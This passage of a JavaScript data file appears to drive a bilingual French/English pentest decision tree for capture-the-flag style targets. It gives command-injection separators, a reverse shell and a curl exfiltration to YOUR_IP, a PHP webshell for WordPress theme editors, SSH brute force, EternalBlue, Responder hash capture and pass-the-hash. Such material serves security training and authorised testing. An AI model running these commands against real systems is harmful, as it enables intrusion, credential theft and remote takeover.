    lookfor: ["Quel framework/langage est utilisé ?", "La valeur mathématique est-elle évaluée dans la réponse ?"],
    lookfor_en: ["What framework/language is being used?", "Is the math expression evaluated in the response?"],
    tips: ["HackTricks SSTI est la meilleure référence — book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection"],
    tips_en: ["HackTricks SSTI is the best reference — book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection"],
    choices: [
      { label: "RCE obtenu via SSTI", label_en: "RCE obtained via SSTI", next: "rce_found", icon: "💥" }
    ]
  },

  "web_cmd_injection": {
    id: "web_cmd_injection", title: "Command Injection", title_en: "Command Injection", category: "web", icon: "⚡",
    description: "L'application passe des données utilisateur à une commande shell → exécution de commandes.",
    description_en: "The application passes user data to a shell command → command execution.",
    commands: [
      { label: "Séparateurs à tester", label_en: "Separators to test", cmd: "127.0.0.1; id\n127.0.0.1 && id\n127.0.0.1 | id\n127.0.0.1 || id\n127.0.0.1 `id`\n127.0.0.1 $(id)" },
      { label: "Blind injection — via time delay", label_en: "Blind injection — via time delay", cmd: "127.0.0.1; sleep 5\n127.0.0.1 && ping -c 5 127.0.0.1" },
      { label: "Blind injection — exfil via DNS", label_en: "Blind injection — exfil via DNS", cmd: "127.0.0.1; curl http://YOUR_IP:PORT/$(id|base64)" },
      { label: "Reverse shell depuis command injection", label_en: "Reverse shell from command injection", cmd: "127.0.0.1; bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'" }
    ],
    lookfor: ["Le résultat de la commande apparaît dans la réponse", "Délai réseau pour injection blind"],
    lookfor_en: ["Command output appears in the response", "Network delay for blind injection"],
    tips: ["URL-encoder les payloads si dans un paramètre GET", "Burp Collaborator pour détecter blind injection via DNS"],
    tips_en: ["URL-encode payloads if in a GET parameter", "Burp Collaborator to detect blind injection via DNS"],
    choices: [
      { label: "RCE confirmé", label_en: "RCE confirmed", next: "rce_found", icon: "💥" }
    ]
  },

  "web_api": {
    id: "web_api", title: "API Trouvée", title_en: "API Found", category: "web", icon: "⚡",
    description: "Explorer les endpoints API, tester l'authentification et les injections.",
    description_en: "Explore API endpoints, test authentication and injections.",
    commands: [
      { label: "Fuzzer les endpoints API", label_en: "Fuzz API endpoints", cmd: "ffuf -w /usr/share/dirb/wordlists/common.txt -u http://TARGET_IP/api/FUZZ" },
      { label: "Tester sans authentification", label_en: "Test without authentication", cmd: "curl http://TARGET_IP/api/users\ncurl http://TARGET_IP/api/admin" },
      { label: "Tester méthodes HTTP", label_en: "Test HTTP methods", cmd: "curl -X PUT http://TARGET_IP/api/user/1 -d '{\"role\":\"admin\"}'\ncurl -X DELETE http://TARGET_IP/api/user/2" },
      { label: "Chercher documentation API", label_en: "Look for API documentation", cmd: "curl http://TARGET_IP/api/docs\ncurl http://TARGET_IP/swagger.json\ncurl http://TARGET_IP/openapi.json" }
    ],
    lookfor: ["JWT dans les réponses ou headers Authorization", "Données sensibles retournées sans auth", "Endpoints admin", "Mass Assignment (envoyer des champs supplémentaires)"],
    lookfor_en: ["JWT in responses or Authorization headers", "Sensitive data returned without auth", "Admin endpoints", "Mass Assignment (sending extra fields)"],
    tips: ["Postman ou Insomnia pour tester les APIs interactivement", "IDOR : changer /api/user/1 → /api/user/2"],
    tips_en: ["Postman or Insomnia to test APIs interactively", "IDOR: change /api/user/1 → /api/user/2"],
    choices: [
      { label: "JWT trouvé", label_en: "JWT found", next: "web_jwt", icon: "🎟️" },
      { label: "Endpoint sans auth retourne données sensibles / RCE", label_en: "Unauthenticated endpoint returns sensitive data / RCE", next: "rce_found", icon: "💥" },
      { label: "Mass assignment / privilege escalation", label_en: "Mass assignment / privilege escalation", next: "web_authenticated", icon: "⬆️" }
    ]
  },

  "web_jwt": {
    id: "web_jwt", title: "JWT Token", title_en: "JWT Token", category: "web", icon: "🎟️",
    description: "JSON Web Tokens mal configurés peuvent être forgés pour obtenir des privilèges élevés.",
    description_en: "Misconfigured JSON Web Tokens can be forged to obtain elevated privileges.",
    commands: [
      { label: "Décoder le JWT", label_en: "Decode the JWT", cmd: "# Sur jwt.io ou :\necho 'PAYLOAD_PART' | base64 -d" },
      { label: "Test algorithm none", label_en: "Test algorithm none", cmd: "# Modifier header : {\"alg\":\"none\"}\n# Supprimer la signature\njwt_tool TOKEN -X a" },
      { label: "Brute force clé secrète faible", label_en: "Brute force weak secret key", cmd: "hashcat -a 0 -m 16500 TOKEN /usr/share/wordlists/rockyou.txt\njwt_tool TOKEN -C -d /usr/share/wordlists/rockyou.txt" },
      { label: "Modifier le payload", label_en: "Modify the payload", cmd: "# Changer role:user → role:admin, puis re-signer\njwt_tool TOKEN -T" }
    ],
    lookfor: ["Algorithme : HS256, RS256, none", "Claims : role, admin, user_id", "Clé secrète faible dans le code source"],
    lookfor_en: ["Algorithm: HS256, RS256, none", "Claims: role, admin, user_id", "Weak secret key in source code"],
    tips: ["Algorithm confusion RS256→HS256 : utiliser la clé publique comme secret HMAC", "jwt.io pour décoder rapidement"],
    tips_en: ["Algorithm confusion RS256→HS256: use the public key as HMAC secret", "jwt.io to decode quickly"],
    choices: [
      { label: "JWT forgé → accès admin", label_en: "JWT forged → admin access", next: "web_authenticated", icon: "✅" }
    ]
  },

  "web_git_exposed": {
    id: "web_git_exposed", title: "Répertoire .git Exposé", title_en: "Exposed .git Directory", category: "web", icon: "🐙",
    description: "Le dépôt git est accessible publiquement → récupérer le code source et les secrets.",
    description_en: "The git repository is publicly accessible → retrieve source code and secrets.",
    commands: [
      { label: "Dumper le repo", label_en: "Dump the repo", cmd: "git-dumper http://TARGET_IP/.git ./repo\n# ou : gittools / gitdumper.sh" },
      { label: "Analyser les commits", label_en: "Analyze commits", cmd: "cd repo\ngit log --oneline\ngit show COMMIT_HASH" },
      { label: "Chercher secrets dans l'historique", label_en: "Search secrets in history", cmd: "git log -p | grep -i 'password\\|secret\\|key\\|token\\|credential'" },
      { label: "truffleHog — scanner les secrets", label_en: "truffleHog — scan for secrets", cmd: "trufflehog git file://./repo" }
    ],
    lookfor: ["Mots de passe, API keys, credentials dans les fichiers", "Anciens commits avec données sensibles supprimées", "Fichiers de config avec connexions DB"],
    lookfor_en: ["Passwords, API keys, credentials in files", "Old commits with sensitive data that was deleted", "Config files with DB connections"],
    tips: ["Même si les fichiers ont été supprimés, git log -p les montre"],
    tips_en: ["Even if files were deleted, git log -p still shows them"],
    choices: [
      { label: "Credentials trouvés", label_en: "Credentials found", next: "credentials_found", icon: "🏆" },
      { label: "Code source révèle une autre vulnérabilité", label_en: "Source code reveals another vulnerability", next: "web_param_vuln", icon: "🎯" }
    ]
  },

  "web_sensitive_files": {
    id: "web_sensitive_files", title: "Fichiers Sensibles Trouvés", title_en: "Sensitive Files Found", category: "web", icon: "📁",
    description: "Des fichiers de configuration, backups ou credentials sont accessibles.",
    description_en: "Configuration files, backups or credentials are accessible.",
    commands: [
      { label: "Lire le fichier .env", label_en: "Read .env file", cmd: "curl http://TARGET_IP/.env" },
      { label: "Fichiers à toujours vérifier", label_en: "Files to always check", cmd: "/.env\n/config.php, /config.yml, /config.json\n/wp-config.php\n/database.yml\n/settings.py\n/application.properties\n/.htpasswd\n/backup.zip, /backup.tar.gz\n/id_rsa, /.ssh/id_rsa" },
      { label: "Télécharger backup", label_en: "Download backup", cmd: "wget http://TARGET_IP/backup.zip" }
    ],
    lookfor: ["DB credentials", "API keys", "Mots de passe en clair", "Informations sur l'infrastructure"],
    lookfor_en: ["DB credentials", "API keys", "Plaintext passwords", "Infrastructure information"],
    tips: ["Un backup zip peut contenir le code source entier → chercher hardcoded credentials"],
    tips_en: ["A backup zip may contain the entire source code → look for hardcoded credentials"],
    choices: [
      { label: "Credentials DB ou application trouvés", label_en: "DB or application credentials found", next: "credentials_found", icon: "🏆" },
      { label: "Clé SSH trouvée", label_en: "SSH key found", next: "ssh_key_stolen", icon: "🔑" }
    ]
  },

  "web_idor": {
    id: "web_idor", title: "IDOR — Insecure Direct Object Reference", title_en: "IDOR — Insecure Direct Object Reference", category: "web", icon: "🔄",
    description: "Manipulation d'identifiants dans les URLs/paramètres pour accéder à d'autres ressources.",
    description_en: "Manipulation of identifiers in URLs/parameters to access other resources.",
    commands: [
      { label: "Test IDOR basique", label_en: "Basic IDOR test", cmd: "/api/user/1 → /api/user/2\n/profile?id=100 → /profile?id=101\n/download?file=report1.pdf → /download?file=../../../etc/passwd" },
      { label: "IDOR avec Burp Intruder", label_en: "IDOR with Burp Intruder", cmd: "Capturer la requête > Burp Intruder > Sniper\nPayload : séquence numérique 1-1000\nFiltrer par taille de réponse différente" }
    ],
    lookfor: ["Données d'autres utilisateurs", "Accès à des ressources admin", "Fichiers d'autres utilisateurs"],
    lookfor_en: ["Other users' data", "Access to admin resources", "Other users' files"],
    tips: ["Tester les UUIDs aussi : remplacer par un UUID d'un autre utilisateur"],
    tips_en: ["Also test UUIDs: replace with another user's UUID"],
    choices: [
      { label: "Accès admin ou données sensibles obtenus", label_en: "Admin access or sensitive data obtained", next: "web_authenticated", icon: "✅" }
    ]
  },

  "web_template_edit": {
    id: "web_template_edit", title: "Éditeur de Template / Fichiers (Admin)", title_en: "Template / File Editor (Admin)", category: "web", icon: "✏️",
    description: "Interface admin permettant d'éditer des fichiers → injecter du code PHP.",
    description_en: "Admin interface allowing file editing → inject PHP code.",
    commands: [
      { label: "WordPress — éditeur de thème", label_en: "WordPress — theme editor", cmd: "Dashboard > Appearance > Theme Editor\n# Modifier 404.php ou functions.php :\n<?php system($_GET['cmd']); ?>" },
      { label: "Accéder au webshell WordPress", label_en: "Access the WordPress webshell", cmd: "curl 'http://TARGET_IP/wp-content/themes/THEME_NAME/404.php?cmd=id'" },
      { label: "Drupal — éditeur PHP (si module activé)", label_en: "Drupal — PHP editor (if module enabled)", cmd: "Modules > PHP Filter activé\n# Créer du contenu avec PHP\n<?php system('id'); ?>" }
    ],
    lookfor: ["Quel fichier est éditable et exécutable ?"],
    lookfor_en: ["Which file is editable and executable?"],
    tips: ["WordPress : 404.php est souvent le plus facile à modifier et à déclencher (visiter une page inexistante)"],
    tips_en: ["WordPress: 404.php is often the easiest to modify and trigger (visit a non-existent page)"],
    choices: [
      { label: "Code PHP injecté → RCE obtenu", label_en: "PHP code injected → RCE obtained", next: "rce_found", icon: "💥" }
    ]
  },

  "web_deep_enum": {
    id: "web_deep_enum", title: "Énumération Approfondie", title_en: "Deep Enumeration", category: "web", icon: "🔍",
    description: "Rien de trouvé facilement — creuser plus profondément.",
    description_en: "Nothing found easily — dig deeper.",
    commands: [
      { label: "Wordlists plus grandes", label_en: "Larger wordlists", cmd: "# Scan profond avec extensions étendues\nferoxbuster -u http://TARGET_IP \\\n  -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt \\\n  -x php,html,txt,bak,zip,tar.gz \\\n  -o ferox_deep.txt\n\n# Version filtrée — réduire le bruit\nferoxbuster -u http://TARGET_IP \\\n  -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt \\\n  -x php,html,txt,bak,zip,tar.gz \\\n  -C 404,500 \\\n  -o ferox_deep.txt" },
      { label: "Fuzzing de paramètres GET", label_en: "GET parameter fuzzing", cmd: "# Étape 1 — sans filtre pour identifier la taille de réponse par défaut\nffuf -u 'http://TARGET_IP/index.php?FUZZ=test' \\\n  -w /usr/share/wfuzz/wordlist/general/common.txt\n\n# Étape 2 — filtrer par taille/code (remplacer WRONG_SIZE)\nffuf -u 'http://TARGET_IP/index.php?FUZZ=test' \\\n  -w /usr/share/wfuzz/wordlist/general/common.txt \\\n  -fs WRONG_SIZE \\\n  -fc 404,500" },
      { label: "Chercher fichiers de backup", label_en: "Look for backup files", cmd: "# Scan de fichiers sensibles/backup\nffuf -u 'http://TARGET_IP/FUZZ' \\\n  -w /usr/share/dirb/wordlists/big.txt \\\n  -fc 404\n\n# Version filtrée — ne garder que les codes intéressants\nffuf -u 'http://TARGET_IP/FUZZ' \\\n  -w /usr/share/dirb/wordlists/big.txt \\\n  -fc 404,500 \\\n  -mc 200,301,302,401,403" },
      { label: "Encoder l'URL si filtres en place", label_en: "URL-encode if filters are in place", cmd: "# Double encoding : ../ → %252e%252e%252f\n# Unicode : ../ → %c0%ae%c0%ae%c0%af" }
    ],
    lookfor: ["Fichiers .bak, .old, .backup, ~", "Répertoires cachés avec noms inhabituels"],
    lookfor_en: ["Files with .bak, .old, .backup, ~ extensions", "Hidden directories with unusual names"],
    tips: ["Essayer des extensions selon la techno détectée : .aspx (IIS), .jsp (Java), .py, .rb"],
    tips_en: ["Try extensions based on detected technology: .aspx (IIS), .jsp (Java), .py, .rb"],
    choices: [
      { label: "Nouveau répertoire ou fichier intéressant trouvé", label_en: "New interesting directory or file found", next: "web_initial", icon: "🎯" },
      { label: "Paramètre découvert", label_en: "Parameter discovered", next: "web_param_vuln", icon: "💉" }
    ]
  },

  "bypass_ratelimit": {
    id: "bypass_ratelimit", title: "Bypass Rate Limiting", title_en: "Bypass Rate Limiting", category: "web", icon: "🚧",
    description: "L'application limite les tentatives — techniques de contournement.",
    description_en: "The application limits attempts — bypass techniques.",
    commands: [
      { label: "Modifier le header X-Forwarded-For", label_en: "Modify the X-Forwarded-For header", cmd: "hydra ... -H 'X-Forwarded-For: FUZZ'\n# Ou via Burp avec header X-Originating-IP, X-Remote-IP" },
      { label: "Rotation d'IPs avec proxychains", label_en: "IP rotation with proxychains", cmd: "# Configurer proxychains avec liste de proxys\nproxychains hydra ..." },
      { label: "Réduire la vitesse", label_en: "Slow down the attack", cmd: "hydra -t 1 -W 10 ..." }
    ],
    lookfor: ["Headers de rate limiting dans la réponse", "Durée du ban"],
    lookfor_en: ["Rate limiting headers in the response", "Ban duration"],
    tips: ["Parfois juste attendre quelques minutes suffit"],
    tips_en: ["Sometimes just waiting a few minutes is enough"],
    choices: [
      { label: "Bypass réussi — continuer brute force", label_en: "Bypass successful — continue brute force", next: "web_brute_login", icon: "🔨" }
    ]
  },

  // ─── SSH ──────────────────────────────────────────────────────────────────

  "ssh_enum": {
    id: "ssh_enum", title: "SSH Énumération", title_en: "SSH Enumeration", category: "network", icon: "🔐",
    description: "Identifier la version SSH, chercher des CVEs, tenter les credentials par défaut.",
    description_en: "Identify the SSH version, look for CVEs, try default credentials.",
    commands: [
      { label: "Version SSH", label_en: "SSH version", cmd: "nmap -sV -p 22 TARGET_IP\nssh -V TARGET_IP" },
      { label: "Banner grabbing", label_en: "Banner grabbing", cmd: "nc -nv TARGET_IP 22" },
      { label: "Chercher CVEs pour la version", label_en: "Search CVEs for the version", cmd: "searchsploit openssh 7.2\nsearchsploit libssh" },
      { label: "Tester credentials évidents", label_en: "Test obvious credentials", cmd: "ssh root@TARGET_IP\nssh admin@TARGET_IP\n# Mots de passe : root, admin, password, toor" },
      { label: "Énumération d'utilisateurs (CVE-2018-15473)", label_en: "User enumeration (CVE-2018-15473)", cmd: "python3 ssh_user_enum.py --userList /usr/share/metasploit-framework/data/wordlists/unix_users.txt --port 22 TARGET_IP" }
    ],
    lookfor: [
      "OpenSSH version < 7.7 → user enumeration possible",
      "libssh < 0.8.4 → CVE-2018-10933 (auth bypass)",
      "Clés SSH exposées ailleurs (web, FTP)"
    ],
    lookfor_en: [
      "OpenSSH version < 7.7 → user enumeration possible",
      "libssh < 0.8.4 → CVE-2018-10933 (auth bypass)",
      "SSH keys exposed elsewhere (web, FTP)"
    ],
    tips: [
      "Si un utilisateur est connu → brute force ciblé avec hydra",
      "Chercher une clé id_rsa sur la machine via LFI ou autre vecteur"
    ],
    tips_en: [
      "If a username is known → targeted brute force with hydra",
      "Look for an id_rsa key on the machine via LFI or another vector"
    ],
    choices: [
      { label: "Version vulnérable (CVE connue)", label_en: "Vulnerable version (known CVE)", next: "exploit_searchsploit", icon: "💥" },
      { label: "Username énuméré → brute force", label_en: "Username enumerated → brute force", next: "ssh_brute", icon: "🔨" },
      { label: "Clé SSH privée trouvée ailleurs", label_en: "SSH private key found elsewhere", next: "ssh_key_stolen", icon: "🔑" },
      { label: "Credentials par défaut fonctionnent", label_en: "Default credentials work", next: "shell_stabilize", icon: "✅" }
    ]
  },

  "ssh_brute": {
    id: "ssh_brute", title: "SSH Brute Force", title_en: "SSH Brute Force", category: "network", icon: "🔨",
    description: "Attaque par dictionnaire sur SSH avec utilisateur(s) connu(s).",
    description_en: "Dictionary attack against SSH with known username(s).",
    commands: [
      { label: "Hydra SSH", label_en: "Hydra SSH", cmd: "hydra -l USERNAME -P /usr/share/wordlists/rockyou.txt ssh://TARGET_IP -t 4" },
      { label: "Hydra avec liste d'users", label_en: "Hydra with user list", cmd: "hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://TARGET_IP -t 4" },
      { label: "Medusa SSH", label_en: "Medusa SSH", cmd: "medusa -h TARGET_IP -u USERNAME -P /usr/share/wordlists/rockyou.txt -M ssh" },
      { label: "Générer wordlist ciblée", label_en: "Generate targeted wordlist", cmd: "cewl http://TARGET_IP -d 3 -m 5 -w cewl_wordlist.txt\n# Puis utiliser avec hydra" }
    ],
    lookfor: ["Message [22][ssh] host: ... login: ... password: ..."],
    lookfor_en: ["Message [22][ssh] host: ... login: ... password: ..."],
    tips: [
      "-t 4 pour éviter de déclencher fail2ban",
      "CeWL pour créer une wordlist basée sur le site de la cible",
      "Tester d'abord le username comme mot de passe : admin:admin"
    ],
    tips_en: [
      "-t 4 to avoid triggering fail2ban",
      "CeWL to generate a wordlist based on the target's website",
      "First test the username as password: admin:admin"
    ],
    choices: [
      { label: "Credentials SSH trouvés", label_en: "SSH credentials found", next: "shell_stabilize", icon: "✅" }
    ]
  },

  "ssh_key_stolen": {
    id: "ssh_key_stolen", title: "Clé SSH Privée Obtenue", title_en: "SSH Private Key Obtained", category: "network", icon: "🔑",
    description: "Utiliser une clé privée id_rsa pour se connecter.",
    description_en: "Use a private id_rsa key to connect.",
    commands: [
      { label: "Connexion avec clé", label_en: "Connect with key", cmd: "chmod 600 id_rsa\nssh -i id_rsa USER@TARGET_IP" },
      { label: "Cracker passphrase de la clé", label_en: "Crack the key passphrase", cmd: "ssh2john id_rsa > hash.txt\njohn hash.txt --wordlist=/usr/share/wordlists/rockyou.txt" },
      { label: "Identifier le propriétaire", label_en: "Identify the owner", cmd: "# Regarder le commentaire en fin de clé publique\ncat id_rsa.pub" }
    ],
    lookfor: ["La clé est-elle protégée par passphrase ?", "Quel utilisateur correspond à cette clé ?"],
    lookfor_en: ["Is the key protected by a passphrase?", "Which user does this key belong to?"],
    tips: ["Si la passphrase est vide : connexion directe sans mot de passe"],
    tips_en: ["If the passphrase is empty: direct connection without password"],
    choices: [
      { label: "Connexion SSH réussie", label_en: "SSH connection successful", next: "shell_stabilize", icon: "✅" },
      { label: "Passphrase crackée → connexion", label_en: "Passphrase cracked → connection", next: "shell_stabilize", icon: "🔓" }
    ]
  },

  // ─── FTP ──────────────────────────────────────────────────────────────────

  "ftp_enum": {
    id: "ftp_enum", title: "FTP Énumération", title_en: "FTP Enumeration", category: "network", icon: "📂",
    description: "Vérifier l'accès anonyme, la version, les fichiers disponibles.",
    description_en: "Check anonymous access, version and available files.",
    commands: [
      { label: "Test login anonyme", label_en: "Test anonymous login", cmd: "ftp TARGET_IP\n# Login: anonymous\n# Password: anonymous ou email@test.com" },
      { label: "Nmap scripts FTP", label_en: "Nmap FTP scripts", cmd: "nmap -p 21 --script ftp-anon,ftp-bounce,ftp-syst,ftp-vsftpd-backdoor TARGET_IP" },
      { label: "Liste fichiers récursive", label_en: "Recursive file listing", cmd: "ftp> ls -la\nftp> ls -R" },
      { label: "Télécharger tous les fichiers", label_en: "Download all files", cmd: "wget -r ftp://anonymous:anonymous@TARGET_IP/" }
    ],
    lookfor: [
      "Login anonyme accepté",
      "vsftpd 2.3.4 → backdoor (port 6200 s'ouvre après :) dans le username)",
      "Fichiers intéressants : config, credentials, notes"
    ],
    lookfor_en: [
      "Anonymous login accepted",
      "vsftpd 2.3.4 → backdoor (port 6200 opens after :) in the username)",
      "Interesting files: config, credentials, notes"
    ],
    tips: [
      "Si accès en écriture → uploader un webshell si FTP est dans le webroot",
      "mode passif si connexion data échoue : ftp> passive"
    ],
    tips_en: [
      "If write access → upload a webshell if FTP is in the webroot",
      "Passive mode if data connection fails: ftp> passive"
    ],
    choices: [
      { label: "Login anonyme → fichiers intéressants", label_en: "Anonymous login → interesting files", next: "credentials_found", icon: "📄" },
      { label: "vsftpd 2.3.4 détecté → backdoor", label_en: "vsftpd 2.3.4 detected → backdoor", next: "exploit_searchsploit", icon: "💥" },
      { label: "Écriture autorisée dans webroot → upload webshell", label_en: "Write access in webroot → upload webshell", next: "web_upload", icon: "📤" },
      { label: "Credentials trouvés dans les fichiers", label_en: "Credentials found in files", next: "credentials_found", icon: "🏆" }
    ]
  },

  // ─── SMB ──────────────────────────────────────────────────────────────────

  "smb_enum": {
    id: "smb_enum", title: "SMB Énumération (Windows)", title_en: "SMB Enumeration (Windows)", category: "network", icon: "🪟",
    description: "Cartographier les partages SMB, utilisateurs et versions pour identifier des failles.",
    description_en: "Map SMB shares, users and versions to identify vulnerabilities.",
    commands: [
      { label: "Enum4linux — énumération complète", label_en: "Enum4linux — full enumeration", cmd: "enum4linux -a TARGET_IP" },
      { label: "Smbclient — lister les partages", label_en: "Smbclient — list shares", cmd: "smbclient -L //TARGET_IP -N\nsmbclient -L //TARGET_IP -U 'guest'" },
      { label: "Se connecter à un partage", label_en: "Connect to a share", cmd: "smbclient //TARGET_IP/SHARE_NAME -N\nsmbclient //TARGET_IP/SHARE_NAME -U USERNAME" },
      { label: "CrackMapExec — scan rapide", label_en: "CrackMapExec — quick scan", cmd: "crackmapexec smb TARGET_IP\ncrackmapexec smb TARGET_IP -u '' -p '' --shares" },
      { label: "Nmap — scripts SMB", label_en: "Nmap — SMB scripts", cmd: "nmap -p 445 --script smb-vuln-ms17-010,smb-enum-shares,smb-enum-users TARGET_IP" },
      { label: "Smbmap", label_en: "Smbmap", cmd: "smbmap -H TARGET_IP\nsmbmap -H TARGET_IP -u guest" }
    ],
    lookfor: [
      "Partages accessibles sans credentials (null session)",
      "MS17-010 (EternalBlue) — Windows 7/2008 non patché",
      "Utilisateurs et groupes",
      "Partage SYSVOL/NETLOGON (GPO passwords)"
    ],
    lookfor_en: [
      "Shares accessible without credentials (null session)",
      "MS17-010 (EternalBlue) — unpatched Windows 7/2008",
      "Users and groups",
      "SYSVOL/NETLOGON share (GPO passwords)"
    ],
    tips: [
      "Partage IPC$ accessible = null session possible",
      "GPP Passwords dans SYSVOL : chercher Groups.xml avec mot de passe chiffré (déchiffrable)"
    ],
    tips_en: [
      "IPC$ share accessible = null session possible",
      "GPP Passwords in SYSVOL: look for Groups.xml with encrypted password (decryptable)"
    ],
    choices: [
      { label: "MS17-010 (EternalBlue) détecté", label_en: "MS17-010 (EternalBlue) detected", next: "smb_eternalblue", icon: "💥" },
      { label: "Partages accessibles → fichiers intéressants", label_en: "Accessible shares → interesting files", next: "smb_shares", icon: "📁" },
      { label: "Credentials trouvés → passer en SMB authentifié", label_en: "Credentials found → move to authenticated SMB", next: "smb_authenticated", icon: "✅" },
      { label: "GPP Password dans SYSVOL", label_en: "GPP Password in SYSVOL", next: "credentials_found", icon: "🏆" }
    ]
  },

  "smb_shares": {
    id: "smb_shares", title: "Partages SMB Accessibles", title_en: "Accessible SMB Shares", category: "network", icon: "📁",
    description: "Explorer les partages SMB pour trouver des fichiers sensibles.",
    description_en: "Explore SMB shares to find sensitive files.",
    commands: [
      { label: "Se connecter et naviguer", label_en: "Connect and browse", cmd: "smbclient //TARGET_IP/SHARE -N\nsmb: \\> ls\nsmb: \\> get fichier.txt\nsmb: \\> recurse on\nsmb: \\> mget *" },
      { label: "Monter le partage", label_en: "Mount the share", cmd: "sudo mount -t cifs //TARGET_IP/SHARE /mnt/smb -o username=guest,password=''" },
      { label: "Chercher dans tous les fichiers", label_en: "Search all files", cmd: "grep -r 'password\\|credential\\|secret\\|key' /mnt/smb/" }
    ],
    lookfor: ["Fichiers .txt, .docx, .xlsx avec credentials", "Scripts .bat, .ps1 avec mots de passe hardcodés", "Fichiers de config"],
    lookfor_en: [".txt, .docx, .xlsx files with credentials", ".bat, .ps1 scripts with hardcoded passwords", "Config files"],
    tips: ["Si écriture possible → déposer un fichier .lnk malveillant pour capturer NTLM hash avec Responder"],
    tips_en: ["If write access → drop a malicious .lnk file to capture NTLM hash with Responder"],
    choices: [
      { label: "Credentials trouvés", label_en: "Credentials found", next: "credentials_found", icon: "🏆" },
      { label: "Écriture possible → tenter NTLM capture", label_en: "Write access → attempt NTLM capture", next: "smb_ntlm_capture", icon: "🎣" }
    ]
  },

  "smb_eternalblue": {
    id: "smb_eternalblue", title: "EternalBlue (MS17-010)", title_en: "EternalBlue (MS17-010)", category: "exploit", icon: "💥",
    description: "Exploitation du célèbre EternalBlue sur Windows 7/2008/2012 non patché.",
    description_en: "Exploitation of the famous EternalBlue on unpatched Windows 7/2008/2012.",
    commands: [
      { label: "Vérifier la vulnérabilité", label_en: "Check the vulnerability", cmd: "nmap -p 445 --script smb-vuln-ms17-010 TARGET_IP" },
      { label: "Metasploit", label_en: "Metasploit", cmd: "msfconsole\nuse exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS TARGET_IP\nset LHOST YOUR_IP\nrun" },
      { label: "Script Python autonome", label_en: "Standalone Python script", cmd: "python3 ms17_010_eternalblue.py TARGET_IP" },
      { label: "Exploitation sans Metasploit", label_en: "Exploitation without Metasploit", cmd: "git clone https://github.com/3ndG4me/AutoBlue-MS17-010\ncd AutoBlue-MS17-010\npython eternal_checker.py TARGET_IP\nbash shell_prep.sh\npython zzz_exploit.py TARGET_IP" }
    ],
    lookfor: ["La machine est-elle patchée ? (KB4012212 ou supérieur)"],
    lookfor_en: ["Is the machine patched? (KB4012212 or higher)"],
    tips: ["Après EternalBlue → SYSTEM directement → chercher flags dans C:\\Users\\*\\Desktop"],
    tips_en: ["After EternalBlue → SYSTEM directly → look for flags in C:\\Users\\*\\Desktop"],
    choices: [
      { label: "SYSTEM shell obtenu", label_en: "SYSTEM shell obtained", next: "privesc_windows_post", icon: "👑" }
    ]
  },

  "smb_ntlm_capture": {
    id: "smb_ntlm_capture", title: "Capture Hash NTLM avec Responder", title_en: "NTLM Hash Capture with Responder", category: "network", icon: "🎣",
    description: "Capturer des hashes NTLM via Responder pour crackage ou pass-the-hash.",
    description_en: "Capture NTLM hashes via Responder for cracking or pass-the-hash.",
    commands: [
      { label: "Lancer Responder", label_en: "Start Responder", cmd: "sudo responder -I tun0 -dwPv" },
      { label: "Déclencher la capture (si écriture SMB)", label_en: "Trigger the capture (if SMB write access)", cmd: "# Créer fichier .scf ou .lnk pointant vers votre IP\n# Le client Windows essaiera de s'authentifier automatiquement" },
      { label: "Cracker le hash NTLMv2", label_en: "Crack the NTLMv2 hash", cmd: "hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt" }
    ],
    lookfor: ["Hash NTLMv2 capturé dans Responder output"],
    lookfor_en: ["NTLMv2 hash captured in Responder output"],
    tips: ["NTLMv2 difficile à cracker si mot de passe complexe → essayer pass-the-hash avec NTLMv1"],
    tips_en: ["NTLMv2 is hard to crack with complex passwords → try pass-the-hash with NTLMv1"],
    choices: [
      { label: "Hash cracké → credentials", label_en: "Hash cracked → credentials", next: "credentials_found", icon: "🔓" },
      { label: "Hash NTLMv1 → pass-the-hash", label_en: "NTLMv1 hash → pass-the-hash", next: "smb_authenticated", icon: "🔑" }
    ]
  },

  "smb_authenticated": {
    id: "smb_authenticated", title: "SMB Authentifié — Prochaines Étapes", title_en: "Authenticated SMB — Next Steps", category: "network", icon: "✅",
    description: "Avec des credentials valides sur SMB, escalader vers un shell.",
    description_en: "With valid SMB credentials, escalate to a shell.",
    commands: [
      { label: "PSExec — shell distant", label_en: "PSExec — remote shell", cmd: "impacket-psexec DOMAIN/USER:PASSWORD@TARGET_IP\nimpacket-psexec USER:PASSWORD@TARGET_IP" },
      { label: "WinRM (port 5985)", label_en: "WinRM (port 5985)", cmd: "evil-winrm -i TARGET_IP -u USER -p PASSWORD" },
      { label: "CrackMapExec — exécution commandes", label_en: "CrackMapExec — command execution", cmd: "crackmapexec smb TARGET_IP -u USER -p PASSWORD -x 'whoami'" },
      { label: "Pass-the-hash", label_en: "Pass-the-hash", cmd: "impacket-psexec -hashes :NTLM_HASH USER@TARGET_IP\nevil-winrm -i TARGET_IP -u USER -H NTLM_HASH" }
    ],
    lookfor: ["Port 5985 ouvert → WinRM disponible", "Droits admin sur la machine ?"],
    lookfor_en: ["Port 5985 open → WinRM available", "Admin rights on the machine?"],
    tips: ["CrackMapExec avec (Pwn3d!) dans la sortie = droits admin = PSExec possible"],
    tips_en: ["CrackMapExec with (Pwn3d!) in output = admin rights = PSExec possible"],
    choices: [
      { label: "Shell obtenu", label_en: "Shell obtained", next: "shell_stabilize", icon: "✅" }
    ]
  },

  // ─── AUTRES SERVICES ──────────────────────────────────────────────────────

  "mysql_enum": {
    id: "mysql_enum", title: "MySQL Énumération", title_en: "MySQL Enumeration", category: "network", icon: "🗄️",
    description: "MySQL exposé — tenter connexion sans auth ou credentials faibles.",
    description_en: "Exposed MySQL — try connecting without auth or with weak credentials.",
    commands: [
      { label: "Connexion root sans password", label_en: "Root connection without password", cmd: "mysql -h TARGET_IP -u root -p\n# Tenter password vide, ou 'root', 'mysql', 'password'" },
      { label: "Nmap scripts MySQL", label_en: "Nmap MySQL scripts", cmd: "nmap -p 3306 --script mysql-info,mysql-empty-password,mysql-databases TARGET_IP" },
      { label: "Lister les bases de données", label_en: "List databases", cmd: "SHOW DATABASES;\nUSE mysql;\nSELECT user,password FROM user;" },
